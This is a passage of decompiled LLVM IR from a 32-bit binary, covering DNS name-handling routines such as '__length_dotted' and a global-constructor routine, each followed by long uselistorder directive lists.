dec_label_pc_8057599:                             ; preds = %dec_label_pc_8057580
  %v4_80575a4 = add i32 %v3_805758a, %v4_805758a
  store i32 %v4_80575a4, i32* %ebp.global-to-local, align 4
  %tmp = urem i8 %v5_805761037.in, 64
  %v1_80575a7 = zext i8 %tmp to i32
  %v2_80575aa = add i32 %v1_8057587, %arg1
  %v3_80575aa = inttoptr i32 %v2_80575aa to i8*
  %v4_80575aa = load i8, i8* %v3_80575aa, align 1
  %v5_80575aa = zext i8 %v4_80575aa to i32
  %v2_80575ae = mul nuw nsw i32 %v1_80575a7, 256
  %v2_80575b3 = or i32 %v5_80575aa, %v2_80575ae
  store i32 %v2_80575b3, i32* @edx, align 4
  store i32 %v1_80575d9.ph47, i32* @ecx, align 4
  %v2_8057610 = add i32 %v2_80575b3, %arg1
  %v3_8057610 = inttoptr i32 %v2_8057610 to i8*
  %v4_8057610 = load i8, i8* %v3_8057610, align 1
  %v1_8057614 = icmp eq i8 %v4_8057610, 0
  %v1_8057616 = icmp eq i1 %v1_8057614, false
  br i1 %v1_8057616, label %dec_label_pc_8057580, label %dec_label_pc_805761c

dec_label_pc_80575bc:                             ; preds = %dec_label_pc_8057580
  %v2_80575bc = add i32 %v5_805761037, %v1_80575d9.ph47
  %v1_80575c5 = add i32 %v2_80575bc, 1
  store i32 %v1_80575c5, i32* @edi, align 4
  %v10_80575c6 = icmp ult i32 %v1_80575c5, %arg4
  %v1_80575ca = icmp eq i1 %v10_80575c6, false
  br i1 %v1_80575ca, label %dec_label_pc_8057628, label %dec_label_pc_80575cc

dec_label_pc_80575cc:                             ; preds = %dec_label_pc_80575bc
  %v2_80575d2 = add i32 %v1_8057587, %arg1
  %v2_80575d9 = add i32 %v1_80575d9.ph47, %arg3
  %v3_80575dc = inttoptr i32 %v2_80575d9 to i16*
  %v4_80575dc = call i32 @memcpy(i16* %v3_80575dc, i32 %v2_80575d2, i32 %v5_805761037)
  %v0_80575e4 = load i32, i32* @esi, align 4
  %v2_80575e4 = add i32 %v0_80575e4, %v5_805761037
  store i32 %v2_80575e4, i32* @edx, align 4
  br i1 %v8_805758038, label %dec_label_pc_80575f0, label %dec_label_pc_80575ee

dec_label_pc_80575ee:                             ; preds = %dec_label_pc_80575cc
  %v0_80575ee = load i32, i32* %ebp.global-to-local, align 4
  %v2_80575ee = add i32 %v0_80575ee, %v5_805761037
  store i32 %v2_80575ee, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_80575f0

dec_label_pc_80575f0:                             ; preds = %dec_label_pc_80575cc, %dec_label_pc_80575ee
  %v4_8057607 = add i32 %v2_80575bc, %arg3
  %v5_8057607 = inttoptr i32 %v4_8057607 to i8*
  store i8 46, i8* %v5_8057607, align 1
  %v0_805760a.pre = load i32, i32* @edi, align 4
  %v1_8057610.pre.pre = load i32, i32* @edx, align 4
  store i32 %v0_805760a.pre, i32* @ecx, align 4
  %v2_805761027 = add i32 %v1_8057610.pre.pre, %arg1
  %v3_805761028 = inttoptr i32 %v2_805761027 to i8*
  %v4_805761029 = load i8, i8* %v3_805761028, align 1
  %v1_805761431 = icmp eq i8 %v4_805761029, 0
  %v1_805761632 = icmp eq i1 %v1_805761431, false
  %v8_805758033 = icmp eq i8 %stack_var_-17.136, 0
  %v0_805758a.pre.pre = load i32, i32* %ebp.global-to-local, align 4
  br i1 %v1_805761632, label %dec_label_pc_8057580.lr.ph, label %dec_label_pc_805761c

dec_label_pc_8057580.lr.ph:                       ; preds = %dec_label_pc_80575f0, %dec_label_pc_8057572
  %v0_805758a.pre = phi i32 [ 0, %dec_label_pc_8057572 ], [ %v0_805758a.pre.pre, %dec_label_pc_80575f0 ]
  %v8_80575803350 = phi i1 [ false, %dec_label_pc_8057572 ], [ %v8_805758033, %dec_label_pc_80575f0 ]
  %v5_80576103049.in = phi i8 [ %v4_80576102942, %dec_label_pc_8057572 ], [ %v4_805761029, %dec_label_pc_80575f0 ]
  %stack_var_-17.1.ph48 = phi i8 [ 1, %dec_label_pc_8057572 ], [ %stack_var_-17.136, %dec_label_pc_80575f0 ]
  %v1_80575d9.ph47 = phi i32 [ 0, %dec_label_pc_8057572 ], [ %v0_805760a.pre, %dec_label_pc_80575f0 ]
  %v0_8057587.ph46 = phi i32 [ %arg2, %dec_label_pc_8057572 ], [ %v1_8057610.pre.pre, %dec_label_pc_80575f0 ]
  br label %dec_label_pc_8057580

dec_label_pc_805761c:                             ; preds = %dec_label_pc_80575f0, %dec_label_pc_8057599, %dec_label_pc_8057572
  %v0_8057621 = phi i32 [ 0, %dec_label_pc_8057572 ], [ %v4_80575a4, %dec_label_pc_8057599 ], [ %v0_805758a.pre.pre, %dec_label_pc_80575f0 ]
  %v8_8057580.lcssa = phi i1 [ false, %dec_label_pc_8057572 ], [ true, %dec_label_pc_8057599 ], [ %v8_805758033, %dec_label_pc_80575f0 ]
  %v2_8057623 = zext i1 %v8_8057580.lcssa to i32
  %v3_8057623 = add i32 %v0_8057621, 1
  %v4_8057623 = add i32 %v3_8057623, %v2_8057623
  br label %dec_label_pc_805762b

dec_label_pc_8057628:                             ; preds = %dec_label_pc_80575bc, %entry
  br label %dec_label_pc_805762b

dec_label_pc_805762b:                             ; preds = %dec_label_pc_805761c, %dec_label_pc_8057628
  %storemerge = phi i32 [ %v4_8057623, %dec_label_pc_805761c ], [ -1, %dec_label_pc_8057628 ]
  store i32 %v0_805755e, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v1_80575d9.ph47, { 2, 1, 0 }
  uselistorder i8 %v4_8057610, { 1, 0 }
  uselistorder i32 %v2_80575b3, { 0, 2, 1 }
  uselistorder i32 %v4_80575a4, { 0, 2, 1 }
  uselistorder i32 %v5_805761037, { 4, 3, 1, 2, 0 }
  uselistorder i32* %ebp.global-to-local, { 3, 0, 2, 1, 4, 5 }
  uselistorder i8 1, { 1, 10, 13, 2, 12, 8, 5, 6, 0, 3, 4, 9, 11, 7 }
  uselistorder i8 46, { 3, 4, 0, 1, 5, 2 }
  uselistorder i32 (i16*, i32, i32)* @memcpy, { 8, 9, 10, 11, 12, 13, 14, 16, 2, 3, 17, 18, 20, 0, 1, 15, 4, 5, 6, 19, 7 }
  uselistorder i32* @edi, { 3, 193, 194, 23, 195, 196, 197, 22, 198, 199, 4, 200, 0, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 31, 6, 5, 32, 33, 34, 35, 36, 44, 37, 38, 39, 40, 41, 42, 43, 216, 7, 217, 8, 218, 219, 220, 221, 226, 227, 1, 222, 223, 224, 225, 228, 229, 230, 231, 114, 9, 115, 116, 117, 232, 233, 240, 241, 242, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 174, 175, 176, 177, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 10, 129, 130, 131, 132, 133, 134, 135, 344, 345, 11, 346, 347, 12, 350, 351, 301, 302, 303, 52, 53, 54, 352, 353, 354, 369, 171, 13, 172, 173, 45, 46, 47, 48, 49, 50, 51, 186, 14, 187, 188, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 55, 56, 57, 58, 59, 60, 61, 326, 327, 328, 329, 330, 331, 332, 333, 15, 334, 335, 336, 337, 338, 273, 274, 16, 275, 276, 277, 278, 279, 280, 281, 289, 290, 291, 292, 293, 136, 137, 17, 138, 367, 368, 139, 140, 141, 18, 251, 252, 243, 244, 245, 246, 247, 248, 249, 250, 62, 63, 64, 253, 254, 255, 142, 143, 144, 145, 146, 147, 148, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 19, 163, 28, 29, 30, 149, 20, 150, 151, 363, 364, 365, 366, 256, 257, 258, 259, 260, 261, 164, 165, 166, 167, 234, 235, 236, 237, 238, 239, 348, 349, 189, 190, 299, 300, 65, 66, 67, 304, 305, 360, 361, 362, 68, 21, 69, 70, 71, 72, 306, 307, 73, 74, 75, 355, 356, 357, 358, 359, 76, 77, 78, 81, 79, 80, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 2, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 168, 169, 170, 178, 179, 180, 181, 182, 183, 184, 185, 24, 25, 26, 27, 191, 192, 282, 283, 284, 285, 286, 287, 288, 294, 295, 296, 297, 298, 308, 309, 310, 339, 340, 341, 342, 343 }
  uselistorder i32 256, { 1, 2, 3, 4, 5, 48, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 47, 16, 17, 18, 21, 19, 20, 22, 23, 24, 43, 44, 25, 45, 49, 26, 27, 54, 28, 29, 0, 52, 53, 46, 30, 31, 32, 33, 34, 55, 35, 36, 37, 38, 39, 40, 50, 56, 41, 51, 42 }
  uselistorder i8 64, { 0, 1, 5, 6, 2, 7, 3, 4 }
  uselistorder i1 true, { 1, 4, 11, 3, 5, 6, 8, 7, 9, 10, 2, 0 }
  uselistorder i32* @edx, { 8, 178, 179, 180, 181, 182, 183, 184, 22, 3, 188, 186, 187, 2, 189, 190, 191, 192, 193, 194, 195, 196, 50, 54, 51, 52, 53, 197, 198, 199, 200, 201, 202, 203, 209, 204, 205, 206, 207, 208, 4, 23, 167, 111, 112, 113, 114, 115, 116, 117, 210, 211, 222, 212, 5, 226, 227, 228, 229, 449, 9, 6, 24, 168, 118, 119, 213, 214, 10, 215, 216, 217, 120, 121, 122, 123, 124, 125, 533, 534, 535, 536, 11, 537, 538, 452, 456, 176, 457, 57, 540, 55, 541, 458, 544, 545, 552, 551, 542, 160, 86, 12, 87, 88, 89, 90, 91, 92, 93, 161, 162, 163, 164, 165, 56, 461, 462, 13, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 14, 476, 477, 459, 460, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 15, 74, 75, 76, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 16, 515, 516, 517, 518, 519, 520, 521, 547, 166, 230, 231, 233, 1, 185, 232, 448, 126, 218, 219, 220, 77, 221, 127, 128, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 145, 21, 146, 147, 129, 148, 17, 149, 150, 152, 18, 153, 154, 155, 156, 157, 49, 19, 151, 543, 223, 224, 225, 20, 158, 450, 451, 539, 177, 546, 447, 548, 532, 0, 453, 454, 78, 444, 455, 79, 549, 550, 80, 81, 82, 83, 84, 85, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 159, 169, 170, 171, 172, 173, 174, 175, 25, 26, 27, 29, 30, 28, 31, 32, 33, 34, 35, 37, 36, 38, 39, 40, 42, 41, 43, 44, 45, 46, 47, 48, 234, 235, 236, 237, 238, 239, 240, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 263, 264, 265, 266, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 319, 320, 321, 322, 323, 324, 325, 326, 327, 328, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 351, 352, 353, 354, 355, 356, 357, 358, 359, 360, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 381, 382, 383, 384, 385, 386, 387, 388, 389, 390, 391, 392, 393, 394, 395, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 445, 446, 522, 523, 524, 525, 527, 531, 526, 529, 530, 7, 528, 553 }
  uselistorder i32* @esi, { 237, 238, 239, 240, 241, 242, 35, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 253, 254, 255, 256, 257, 258, 259, 260, 261, 262, 36, 51, 52, 10, 7, 58, 53, 54, 55, 56, 57, 263, 11, 264, 265, 269, 266, 267, 268, 276, 270, 271, 272, 273, 274, 275, 277, 278, 279, 280, 281, 282, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 12, 139, 140, 13, 290, 291, 292, 14, 293, 294, 295, 296, 319, 320, 321, 322, 323, 324, 1, 325, 326, 327, 328, 329, 330, 331, 332, 215, 216, 217, 218, 219, 384, 385, 386, 387, 333, 334, 141, 142, 143, 144, 0, 145, 353, 354, 355, 67, 68, 69, 388, 389, 390, 391, 392, 400, 403, 404, 405, 206, 207, 208, 209, 210, 211, 212, 393, 398, 399, 59, 60, 61, 62, 230, 231, 232, 2, 233, 234, 235, 63, 64, 65, 66, 356, 360, 15, 361, 362, 363, 364, 365, 366, 367, 357, 358, 359, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 368, 369, 370, 371, 372, 373, 374, 3, 375, 376, 377, 378, 16, 379, 37, 380, 381, 382, 383, 335, 336, 337, 340, 341, 342, 343, 344, 345, 346, 347, 348, 406, 17, 407, 408, 146, 18, 147, 38, 32, 338, 339, 351, 352, 213, 214, 415, 416, 148, 149, 150, 151, 152, 153, 154, 307, 19, 8, 297, 301, 302, 303, 304, 20, 33, 305, 306, 298, 299, 300, 85, 21, 86, 87, 308, 22, 309, 310, 155, 156, 157, 158, 24, 159, 4, 161, 162, 163, 164, 23, 165, 166, 160, 167, 168, 169, 170, 5, 171, 172, 173, 174, 175, 176, 34, 25, 177, 178, 26, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 27, 196, 197, 198, 28, 50, 179, 6, 180, 181, 394, 395, 396, 397, 409, 410, 411, 412, 413, 414, 311, 312, 313, 314, 29, 315, 316, 317, 318, 199, 200, 201, 202, 283, 284, 285, 286, 287, 30, 31, 288, 289, 401, 402, 349, 350, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 101, 99, 100, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 9, 120, 121, 122, 123, 124, 125, 126, 127, 128, 203, 204, 205, 220, 221, 222, 223, 224, 225, 226, 227, 228, 229, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 236, 417 }
  uselistorder i32 %arg1, { 1, 3, 2, 4, 0, 5 }
  uselistorder label %dec_label_pc_805762b, { 1, 0 }
  uselistorder label %dec_label_pc_80575f0, { 1, 0 }
}

define i32 @__length_dotted(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v1_8057642 = icmp eq i32 %arg1, 0
  br i1 %v1_8057642, label %dec_label_pc_8057671, label %dec_label_pc_8057662.preheader

dec_label_pc_8057662.preheader:                   ; preds = %entry
  store i32 %arg2, i32* @ecx, align 4
  %v2_805766210 = add i32 %arg2, %arg1
  %v3_805766211 = inttoptr i32 %v2_805766210 to i8*
  %v4_805766212 = load i8, i8* %v3_805766211, align 1
  %v1_805766614 = add i32 %arg2, 1
  %v1_805766915 = icmp eq i8 %v4_805766212, 0
  %v1_805766b16 = icmp eq i1 %v1_805766915, false
  br i1 %v1_805766b16, label %dec_label_pc_8057651, label %dec_label_pc_805766d

dec_label_pc_8057648:                             ; preds = %dec_label_pc_8057651
  %v1_8057648 = add i32 %v0_805764817, 2
  br label %dec_label_pc_805766d

dec_label_pc_8057651:                             ; preds = %dec_label_pc_8057662.preheader, %dec_label_pc_8057662
  %v1_805766619 = phi i32 [ %v1_8057666, %dec_label_pc_8057662 ], [ %v1_805766614, %dec_label_pc_8057662.preheader ]
  %v5_805766218.in = phi i8 [ %v4_8057662, %dec_label_pc_8057662 ], [ %v4_805766212, %dec_label_pc_8057662.preheader ]
  %v0_805764817 = phi i32 [ %v2_805765f, %dec_label_pc_8057662 ], [ %arg2, %dec_label_pc_8057662.preheader ]
  %v5_805766218 = zext i8 %v5_805766218.in to i32
  %v1_8057653 = and i32 %v5_805766218, 192
  %v6_8057658 = icmp eq i32 %v1_8057653, 192
  %v2_805765f = add i32 %v5_805766218, %v1_805766619
  br i1 %v6_8057658, label %dec_label_pc_8057648, label %dec_label_pc_8057662

dec_label_pc_8057662:                             ; preds = %dec_label_pc_8057651
  store i32 %v2_805765f, i32* @ecx, align 4
  %v2_8057662 = add i32 %v2_805765f, %arg1
  %v3_8057662 = inttoptr i32 %v2_8057662 to i8*
  %v4_8057662 = load i8, i8* %v3_8057662, align 1
  %v1_8057666 = add i32 %v2_805765f, 1
  %v1_8057669 = icmp eq i8 %v4_8057662, 0
  %v1_805766b = icmp eq i1 %v1_8057669, false
  br i1 %v1_805766b, label %dec_label_pc_8057651, label %dec_label_pc_805766d

dec_label_pc_805766d:                             ; preds = %dec_label_pc_8057662.preheader, %dec_label_pc_8057662, %dec_label_pc_8057648
  %v0_805766d = phi i32 [ %v1_8057648, %dec_label_pc_8057648 ], [ %v1_805766614, %dec_label_pc_8057662.preheader ], [ %v1_8057666, %dec_label_pc_8057662 ]
  %v2_805766f = sub i32 %v0_805766d, %arg2
  br label %dec_label_pc_8057671

dec_label_pc_8057671:                             ; preds = %entry, %dec_label_pc_805766d
  %v0_8057674 = phi i32 [ -1, %entry ], [ %v2_805766f, %dec_label_pc_805766d ]
  ret i32 %v0_8057674

; uselistorder directives
  uselistorder i8 %v4_8057662, { 1, 0 }
  uselistorder i32 %v2_805765f, { 2, 3, 1, 0 }
  uselistorder i32 192, { 0, 3, 1, 4, 2 }
  uselistorder i32 2, { 150, 47, 151, 46, 91, 155, 156, 51, 56, 55, 152, 157, 158, 159, 128, 160, 161, 162, 163, 164, 165, 134, 57, 135, 136, 64, 166, 167, 58, 92, 65, 140, 66, 59, 141, 87, 168, 169, 170, 172, 129, 185, 186, 4, 75, 71, 142, 143, 88, 5, 76, 77, 193, 72, 127, 3, 93, 124, 94, 125, 95, 126, 67, 6, 139, 52, 96, 97, 0, 98, 1, 99, 2, 100, 101, 7, 8, 9, 10, 137, 11, 12, 13, 78, 188, 14, 15, 89, 16, 173, 174, 175, 176, 60, 79, 181, 182, 153, 154, 183, 184, 68, 69, 70, 17, 194, 80, 61, 62, 144, 145, 74, 18, 19, 146, 53, 20, 147, 21, 81, 148, 149, 171, 187, 192, 90, 22, 138, 23, 102, 105, 103, 104, 106, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 107, 108, 82, 39, 40, 41, 42, 48, 43, 49, 44, 109, 110, 83, 111, 112, 113, 73, 114, 115, 116, 130, 131, 132, 133, 117, 118, 119, 120, 177, 50, 178, 63, 179, 84, 54, 180, 121, 122, 85, 191, 86, 189, 45, 190, 123 }
  uselistorder i8 0, { 40, 5, 8, 9, 41, 7, 6, 136, 137, 11, 144, 139, 140, 10, 142, 143, 141, 36, 145, 2, 3, 60, 61, 146, 147, 38, 148, 12, 14, 125, 124, 13, 42, 149, 150, 151, 81, 82, 17, 159, 155, 156, 154, 15, 157, 158, 16, 37, 160, 161, 171, 172, 173, 174, 175, 193, 194, 19, 127, 126, 18, 128, 129, 165, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 4, 185, 99, 100, 216, 101, 217, 220, 76, 43, 55, 77, 20, 219, 199, 200, 201, 62, 202, 203, 204, 205, 206, 207, 44, 208, 22, 183, 184, 21, 138, 102, 103, 56, 1, 32, 33, 34, 31, 0, 45, 46, 47, 104, 176, 188, 189, 123, 166, 167, 162, 164, 163, 105, 106, 107, 108, 109, 110, 111, 23, 112, 113, 24, 114, 115, 116, 117, 118, 119, 120, 121, 58, 218, 168, 169, 170, 122, 152, 153, 63, 64, 25, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 78, 79, 80, 130, 131, 132, 133, 134, 135, 57, 39, 177, 178, 179, 180, 181, 182, 186, 187, 190, 191, 192, 26, 195, 196, 35, 197, 27, 198, 209, 214, 213, 28, 210, 211, 30, 212, 29, 215, 59, 48, 49, 50, 51, 52, 53, 54 }
  uselistorder i32* @ecx, { 27, 6, 8, 26, 7, 121, 124, 15, 125, 126, 127, 128, 16, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 144, 37, 42, 38, 39, 40, 41, 145, 9, 10, 111, 0, 112, 146, 50, 12, 19, 147, 148, 17, 11, 18, 149, 154, 155, 156, 157, 158, 170, 171, 172, 173, 13, 113, 1, 114, 51, 52, 31, 53, 151, 152, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 28, 79, 80, 81, 82, 83, 84, 29, 85, 25, 227, 45, 46, 47, 48, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 20, 199, 174, 175, 176, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 21, 214, 215, 217, 218, 219, 216, 223, 159, 122, 123, 32, 33, 150, 86, 87, 88, 89, 90, 91, 92, 30, 93, 14, 94, 95, 96, 97, 98, 22, 23, 2, 3, 99, 100, 24, 101, 102, 103, 104, 105, 107, 108, 109, 110, 35, 36, 106, 221, 153, 222, 224, 225, 226, 34, 43, 44, 49, 115, 116, 117, 118, 119, 120, 160, 161, 162, 163, 164, 5, 165, 166, 167, 4, 168, 169, 220, 228 }
  uselistorder i32 %arg2, { 4, 0, 1, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8057671, { 1, 0 }
  uselistorder label %dec_label_pc_805766d, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8057651, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_805768c = load i32, i32* @global_var_805b000.538, align 4096
  %v10_8057691 = icmp eq i32 %v0_805768c, -1
  br i1 %v10_8057691, label %dec_label_pc_80576a2, label %dec_label_pc_8057696.preheader

dec_label_pc_8057696.preheader:                   ; preds = %entry
  br label %dec_label_pc_8057696

dec_label_pc_8057696:                             ; preds = %dec_label_pc_8057696.preheader, %dec_label_pc_8057696
  %v4_8057699 = phi i32 [ %v0_805768c, %dec_label_pc_8057696.preheader ], [ %v2_805769b, %dec_label_pc_8057696 ]
  %v0_8057696 = phi i32 [ ptrtoint (i32* @global_var_805b000.538 to i32), %dec_label_pc_8057696.preheader ], [ %v1_8057696, %dec_label_pc_8057696 ]
  %v1_8057696 = add i32 %v0_8057696, -4
  call void @__pseudo_call(i32 %v4_8057699)
  %v1_805769b = inttoptr i32 %v1_8057696 to i32*
  %v2_805769b = load i32, i32* %v1_805769b, align 4
  %v10_805769d = icmp eq i32 %v2_805769b, -1
  %v1_80576a0 = icmp eq i1 %v10_805769d, false
  br i1 %v1_80576a0, label %dec_label_pc_8057696, label %dec_label_pc_80576a2.loopexit

dec_label_pc_80576a2.loopexit:                    ; preds = %dec_label_pc_8057696
  %v2_80576a2.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_80576a2

dec_label_pc_80576a2:                             ; preds = %dec_label_pc_80576a2.loopexit, %entry
  %v2_80576a2 = phi i32 [ %v2_80576a2.pre, %dec_label_pc_80576a2.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_80576a2

; uselistorder directives
  uselistorder i32 %v0_805768c, { 1, 0 }
  uselistorder i1 false, { 916, 498, 3, 0, 1, 5, 499, 501, 500, 4, 503, 502, 55, 7, 56, 512, 507, 511, 509, 510, 78, 504, 505, 508, 6, 513, 514, 515, 516, 139, 141, 142, 143, 144, 140, 145, 146, 147, 150, 148, 149, 517, 518, 523, 57, 519, 520, 522, 521, 524, 525, 530, 529, 526, 527, 528, 8, 9, 434, 435, 436, 79, 531, 532, 533, 534, 535, 536, 312, 313, 314, 537, 58, 538, 539, 315, 316, 317, 863, 59, 11, 542, 543, 544, 545, 547, 546, 10, 562, 563, 60, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 845, 846, 848, 847, 12, 437, 438, 439, 440, 318, 319, 320, 581, 582, 555, 556, 557, 321, 322, 323, 324, 325, 326, 327, 97, 328, 329, 330, 331, 332, 333, 334, 823, 824, 825, 826, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 349, 350, 917, 918, 74, 351, 80, 352, 353, 354, 864, 865, 866, 919, 933, 934, 935, 936, 937, 940, 81, 941, 942, 939, 932, 920, 117, 423, 424, 425, 426, 427, 428, 921, 922, 207, 208, 209, 210, 211, 212, 13, 429, 430, 75, 493, 14, 494, 495, 594, 151, 925, 926, 927, 928, 929, 930, 931, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 867, 152, 153, 154, 155, 156, 157, 158, 159, 160, 880, 881, 882, 883, 884, 885, 886, 887, 52, 889, 888, 893, 890, 891, 892, 15, 894, 895, 431, 432, 853, 583, 584, 586, 587, 938, 17, 820, 819, 16, 506, 355, 356, 357, 82, 832, 833, 834, 835, 837, 836, 18, 838, 358, 19, 585, 839, 840, 433, 359, 360, 560, 558, 559, 20, 61, 548, 553, 552, 83, 554, 550, 549, 84, 551, 161, 561, 162, 361, 362, 363, 364, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 380, 379, 21, 381, 382, 383, 384, 385, 387, 53, 388, 386, 389, 391, 390, 22, 392, 393, 395, 394, 85, 396, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 136, 137, 923, 86, 924, 23, 564, 565, 566, 567, 568, 420, 540, 541, 163, 164, 165, 166, 167, 856, 189, 170, 98, 168, 169, 87, 88, 171, 172, 173, 174, 175, 176, 177, 178, 179, 24, 25, 180, 181, 182, 183, 184, 185, 186, 187, 76, 188, 54, 99, 100, 101, 102, 190, 193, 191, 192, 194, 195, 196, 197, 103, 198, 104, 199, 200, 202, 201, 27, 26, 203, 204, 205, 206, 213, 214, 215, 105, 216, 217, 218, 219, 220, 221, 224, 106, 222, 223, 36, 37, 225, 62, 226, 227, 228, 229, 230, 231, 232, 235, 107, 233, 234, 34, 35, 236, 63, 237, 238, 239, 240, 241, 242, 243, 64, 244, 245, 246, 247, 248, 249, 250, 253, 108, 251, 252, 32, 33, 254, 255, 256, 257, 258, 259, 262, 109, 260, 261, 30, 31, 263, 95, 49, 65, 264, 265, 266, 94, 267, 268, 269, 270, 271, 272, 275, 110, 273, 274, 28, 29, 276, 50, 96, 66, 277, 278, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 111, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 421, 422, 441, 442, 443, 112, 464, 113, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 89, 90, 465, 466, 467, 468, 469, 470, 471, 472, 473, 51, 474, 114, 475, 476, 477, 115, 478, 479, 116, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 496, 497, 588, 589, 590, 591, 592, 39, 593, 38, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 67, 803, 804, 805, 806, 807, 77, 808, 809, 810, 811, 812, 813, 814, 815, 816, 821, 817, 818, 68, 822, 827, 93, 828, 69, 829, 70, 830, 831, 40, 843, 841, 842, 41, 844, 42, 849, 850, 851, 43, 852, 2, 854, 855, 857, 858, 859, 71, 860, 861, 862, 896, 912, 897, 898, 899, 900, 905, 909, 910, 911, 44, 901, 91, 902, 903, 904, 72, 48, 906, 47, 73, 46, 907, 908, 45, 913, 914, 915, 138, 92, 943, 944 }
